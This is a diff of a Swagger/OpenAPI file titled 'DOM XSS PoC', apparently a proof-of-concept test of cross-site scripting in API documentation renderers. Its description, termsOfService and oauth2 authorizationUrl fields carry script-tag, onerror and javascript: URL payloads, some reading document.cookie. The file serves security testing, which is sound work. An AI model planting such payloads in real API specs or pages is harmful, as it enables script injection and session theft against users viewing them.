@@ -1,16 +1,20 @@
 swagger: '3.0.0'
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
+security:
+  - a: []
+components:
+  securitySchemes:
+    a:
+      type: oauth2
+      authorizationUrl: 'javascript:alert(document.domain)//'
 info:
   version: "0.0.1"
   title: DOM XSS PoC
-  description: '<div><h2><script>alert("xss")</script></h2></div>onerror=alert(document.cookie) src>">'
-  termsOfService: "<script>alert("xss")</script>"
+  description: >
+    <div><h2><script>alert("xss")</script></h2></div>onerror=alert(document.cookie) src>"
+  termsOfService: "<script>alert('xss')</script>"
 paths:
   /:
     get:
       responses:
-        200:
+        '200':
           description: Echo GET
